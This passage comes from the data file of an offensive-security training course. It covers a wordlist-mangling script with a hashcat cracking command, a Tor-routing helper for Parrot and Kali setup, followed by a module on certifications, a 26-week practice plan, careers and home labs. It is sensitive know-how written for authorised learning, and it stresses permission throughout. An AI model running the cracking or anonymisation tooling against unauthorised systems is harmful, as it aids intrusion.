cat base.tmp base.tmp | awk '{print $0; print $0"123"; print $0"!"; print $0 tolower($0)}' \\
  | sort -u | grep -vE '^.{0,3}$' > "$OUT"
rm -f base.tmp
echo "[+] $(wc -l < "$OUT") words -> $OUT"
# pair with rules for hashcat:
echo "    hashcat -m 1000 hashes.txt $OUT -r best64.rule"
WEOF
chmod +x ~/scripts/mkwords.sh
\`\`\`

\`\`\`bash
# --- Parrot/Kali system-level tweaks worth scripting ---
# Parrot: wrap anonsurf into an engagement-aware helper
cat > ~/scripts/tor-mode.sh <<'TEOF'
#!/usr/bin/env bash
case "\${1:-status}" in
  on)   sudo anonsurf start && anonsurf myip ;;
  off)  sudo anonsurf stop  && echo "back to normal routing" ;;
  *)    anonsurf status; anonsurf myip ;;
esac
TEOF
chmod +x ~/scripts/tor-mode.sh

# Kali: batch metapackage management non-interactively
sudo apt update && sudo apt install -y kali-tools-web kali-tools-windows-resources
# Add your own tools to PATH properly instead of dumping binaries in /usr/bin:
mkdir -p ~/tools/bin
echo 'export PATH="$HOME/tools/bin:$HOME/scripts:$PATH"' >> ~/.zshrc
cp ~/tools/opt/ligolo/proxy ~/tools/bin/ && source ~/.zshrc && which proxy

# Keep everything versioned so a rebuild is 10 minutes and never a mystery:
cd ~/scripts && git add -A && git commit -m "recon pipeline + operator aliases" && git push
\`\`\`

>! Do not copy random aliases and "one-liner hacking scripts" from the internet into a root-writable path. You will run them against a client network. Read every line, understand what it touches, and keep your own scripts in \`~/scripts\` under git — so you know exactly what changed and when.

>= The real end state of this module: a fresh Kali or Parrot VM, plus \`git clone\` of your dotfiles and scripts, plus one install script, and you are operational in fifteen minutes with every habit from this manual already wired in. Write that install script.`}
  ],
  keyIdeas:[
    'Aliases for comfort, functions for leverage: fscan, mkeng, logrun pay back on day one.',
    'Every pipeline: discover → filter → probe → log → report-ready artefact. Test each layer.',
    'Automate the tools: msf resource scripts, custom NSE Lua, custom Metasploit modules.',
    'Build target-specific wordlists (cewl + mangling + rules) instead of always shipping rockyou.',
    '~/scripts under git + a PATH line + an install script = 15-minute rebuild forever.',
    'Never run scripts you have not read from a path root can write to.'
  ],
  tools:['t-bash','t-tmux','t-nc','t-nuclei','t-markdown','t-git'],
  labs:['lab-forge','lab-report'],
  xp:240
},

/* ---------------------------------------------------------------- 15 ---- */
{
  id:'m15', n:'15', phase:'MASTERY', title:'The Path to Expert',
  blurb:'Certifications that matter, the skills employers actually test, a 26-week practice plan, how to keep learning, and how to build a reputation that brings work to you.',
  why:'Skill without direction is a hobby. This module is about deliberate practice: what to learn next, in what order, and how to prove it to someone who is hiring.',
  lessons:[
    { t:'Certifications, honestly ranked', body:`\`\`\`text
CERT                  WHO IT IS FOR                    COST (approx)     REAL VALUE
OSCP / OSCP+          offensive fundamentals, hands-on  ~$1,600+          the one that opens doors.
                      exam: 24h practical                             Hard, respected, and it proves
                                                                      you can work without hints.
CRTP                  Active Directory attack basics    ~$250             excellent value for AD-specific
(Altered Security)                                                     skills; lighter than OSCP
CRTO                  red team ops, C2, OPSEC           ~$400             the best red-team-specific cert
OSEP                  evasion, AD, advanced exploitation ~$1,600         after OSCP, for real depth
PNPT (TCM)            blue+red, report-writing focus    ~$400             great value, very practical
eJPT (INE)            entry level, guided                ~$250             a cheap confidence milestone
CEH                   broad, theory-heavy, expensive    ~$1,200+          HR checkbox in some regions.
                                                                      Weak practical signal.
CompTIA PenTest+      broad, mid-level, vendor-neutral  ~$400             good for government/DoD roles
CISSP                 management/architecture, not hands-on ~$750          for the role AFTER pentesting
Burp Suite Certified  web exploitation, practical      ~$100             best pure web-app credential

THE HONEST ANSWER: OSCP (or OSCP+ now) plus a public portfolio of lab writeups beats
a wall of certificates. One OSCP with a blog beats five certs with no proof of work.
Certs get you the interview. The writeups get you the offer.
\`\`\`

**What the exam actually tests** (this is the part people misunderstand): not "do you know Metasploit". It tests whether you can, alone, with no hints, in a limited time, enumerate a machine you have never seen, find the path, document every step, and produce a *report* — because the report is half the mark.

\`\`\`bash
# --- the practice loop that actually builds exam skill ---
# 1. Machine you have not seen. Timer running. No writeups. No hints.
# 2. Time-box each phase:  20 min recon/enum, 40 min first foothold attempt,
#    then reassess rather than tunnel-visioning for 4 hours.
# 3. If stuck after 45 min: take ONE hint. Note it. Move on. Come back later.
# 4. After rooting: write the report section IMMEDIATELY while it is fresh.
# 5. Next day: redo the same box from scratch, no notes, to test retention.
# 6. Weekly: review your notes for PATTERNS ("I miss credentials in config files").
\`\`\`

\`\`\`bash
# --- keep a public portfolio (this is the actual career move) ---
mkdir -p ~/portfolio && cd ~/portfolio && git init
cat > README.md <<'EOF'
# zoth — offensive security notes
## Machines
- [HTB] codename — Linux — user: LFI→log poisoning, root: SUID tar wildcard cron
- [THM]  codename — Windows — AD: kerberoast svc account → local admin → DCSync
## Original work
- Custom NSE script: zoth-banner.nse (fingerprints internal status endpoints)
- recon.sh: passive→active pipeline (subfinder/amass/crt.sh → httpx → nmap)
EOF
git add -A && git commit -m "portfolio start" && git push
# Remember: never publish flags, never publish another platform's solutions verbatim,
# always check the platform's rules on writeups. HTB/THM writeups are fine after retirement.
\`\`\`

>= Practical order if you are starting today: THM fundamentals → HTB easy Linux boxes → PortSwigger Academy (web) → OSCP → CRTP or CRTO depending on whether you want pentest or red team. Do not buy the expensive cert until easy boxes take you under two hours.`},

    { t:'The 26-week deliberate practice plan', body:`Structure beats enthusiasm. Two to three hours a day, six days a week is enough to be employable in six months if the practice is *directed*.

\`\`\`text
WEEKS 1-3    FOUNDATIONS
  Linux CLI fluency (module 02), Kali/Parrot setup (01), legal/scope (00)
  Deliverable: your dotfiles repo with aliases + fscan + mkeng working

WEEKS 4-7    RECON & ENUMERATION
  nmap properly, service enumeration, web fuzzing, wordlist choice
  Deliverable: recon.sh pipeline; 10 THM rooms done

WEEKS 8-13   WEB + EXPLOITATION
  PortSwigger Academy: SQLi, XSS, access control, SSRF, auth (the whole Apprentice level)
  Deliverable: writeups for 15 PortSwigger labs; 10 HTB easy machines rooted

WEEKS 14-17  PRIVESC + PASSWORDS
  Linux privesc (module 09) + hashcat rules + spraying discipline (07)
  Deliverable: every privesc path from GTFOBins tried at least once in a lab

WEEKS 18-22  WINDOWS & AD
  SMB relay, NetExec, BloodHound, Kerberoasting, Certipy (module 08)
  Deliverable: build your own AD lab (1 DC + 2 workstations), document 5 attack paths

WEEKS 23-26  PIVOTING, REPORTING, EXAM SIMULATION
  ligolo-ng, chisel (10); report writing (13)
  Deliverable: 5 full reports for machines you rooted; one timed 12-hour mock exam

EVERY WEEK, regardless of stage:
  - 1 machine you have not seen, timed, no writeups, with a written report
  - 1 writeup published (portfolio)
  - 30 min reading: a CVE analysis, a vendor research blog, or a conference talk
\`\`\`

\`\`\`bash
# --- make the habit measurable ---
cat > ~/scripts/trainlog.sh <<'EOF'
#!/usr/bin/env bash
# trainlog.sh "<what you did>" [minutes]
D="$HOME/notes/training"; mkdir -p "$D"
echo "$(date -Is) | \${2:-0}min | $1" >> "$D/$(date +%Y-%m).log"
tail -3 "$D/$(date +%Y-%m).log"
EOF
chmod +x ~/scripts/trainlog.sh
~/scripts/trainlog.sh "HTB codename: rooted user, stuck on root (SUID research)" 150
\`\`\`

\`\`bash
# --- what to read, permanently on rotation ---
# PortSwigger Research blog      web exploitation, the deepest public source
# Google Project Zero            exploitation and vulnerability research
# Orange Tsai / Assetnote /watchTowr   high-end web and edge-device research
# SANS Internet Storm Center      daily blue-team context
# The DFIR Report                 real intrusion walkthroughs - see what you'd be up against
# Ippsec (video)                  methodology narration while solving boxes
# Your own notes, last month      the most underrated reading list you have
\`\`\`

>= The 20-minute rule for being stuck: try for 20 minutes, then take one hint, then move on and return. Sitting on one box for eight hours teaches stubbornness, not technique. Volume plus variety is what builds pattern recognition.`},

    { t:'Where the work is, and how to get it', body:`\`\`\`text
ROLE                       WHAT YOU DO                       TYPICAL ENTRY
penetration tester         scoped tests, reports, debriefs   2-5 yrs, OSCP-ish
red team operator          adversary simulation, stealth    senior, after pentest
vulnerability researcher   find new bugs, write exploits     research skills, published work
application security eng   fix the bugs, design secure apps  dev background + security
SOC analyst                detect and respond to attacks     entry point, blue side
security engineer          build the controls attackers hit  infra background
bug bounty hunter          independent, per-finding payout   needs a savings runway
\`\`\`

\`\`\`bash
# --- the job-hunt artefacts that actually get read, in priority order ---
# 1. A public portfolio of writeups. This is the single strongest signal. It shows
#    methodology, communication, and that you actually do the work.
# 2. A home lab you can describe in detail: architecture, what you built, what you learned.
# 3. Your own tooling: a script, an NSE script, a small tool. Proof you go past "use".
# 4. Certifications. They open the ATS door and give an interview vocabulary.
# 5. Community presence: conference talks, local meetups, CTF placements, blog posts.
\`\`\`

\`\`\`text
--- the interview questions that actually get asked (be ready for all of them) ---
  "Walk me through testing a web application you have never seen."
  "How do you decide what is in scope?"                 <- tests judgement, not skill
  "What do you do when you find something outside scope?" <- the ethics question
  "Explain SQL injection to a non-technical stakeholder."
  "You have a shell on a Linux box. First five commands?"
  "How do you report a critical finding to a client who will not want to hear it?"
  "Tell me about a time you broke something."            <- honesty tests, all of them
\`\`\`

\`\`\`bash
# --- the home lab that interviews well: describe it like an architect ---
# attacker:   Kali (VM)                  
# targets:    Metasploitable2, DVWA, Juice Shop, a deliberately-vulnerable AD domain
# domain:     DC01 (Win Server) + WS01/WS02 (Win 10) + a Linux member server
# network:    segmented VLANs so pivoting is REQUIRED to reach the second subnet
# monitoring: Security Onion or Wazuh or just Sysmon + Splunk free, so you can SEE your
#             own attacks from the defender's side
# the point:  being able to say "I built it, I attack it, and I read the alerts it produces"
#             puts you ahead of candidates who only followed tutorials
\`\`\`

\`\`\`bash
# --- contributions that are actually welcomed (not drive-by noise) ---
# * A new NSE script for a service nobody has written one for
# * A tool improvement PR (docs, a bug, an edge case you hit)
# * A precise, reproducible bug report to an open-source project
# * A writeup of a technique with a reproduction environment attached
# * A talk at a local meetup. Any topic. First talks are always bad, and that is fine.
\`\`\`

>= **The double-fluency principle.** The most valuable offensive security professionals can also read the defender's telemetry and explain their findings to a board. If you can attack, detect your own attack, and explain both in plain English, you are in the top few percent of candidates regardless of certificates.

>! Stay on the right side of the line for your entire career. Everything in this manual is for systems you own or are explicitly authorised to test. **One unauthorised "just to see if it works" is enough to end the career before it starts** — and it is a real, common way that people with genuine talent lose everything. The skill is the same; only the permission differs.`}
  ],
  keyIdeas:[
    'OCSP+CRTO or CRTP + a public portfolio beats a wall of certificates.',
    'The exam tests solo enumeration, documentation and reporting — practise the report as much as the exploit.',
    '26 weeks, 2-3h/day, directed: foundations → recon → web → privesc → AD → pivoting/reporting.',
    'Publish writeups weekly; one machine a week, timed, no hints, with a report.',
    'Home lab that you can describe as an architect, including defender telemetry.',
    'One unauthorised action ends the career. The skill is identical; only permission differs.'
  ],
  tools:['t-git','t-markdown','t-shodan','t-burp'],
  labs:['lab-report'],
  xp:160
}

];
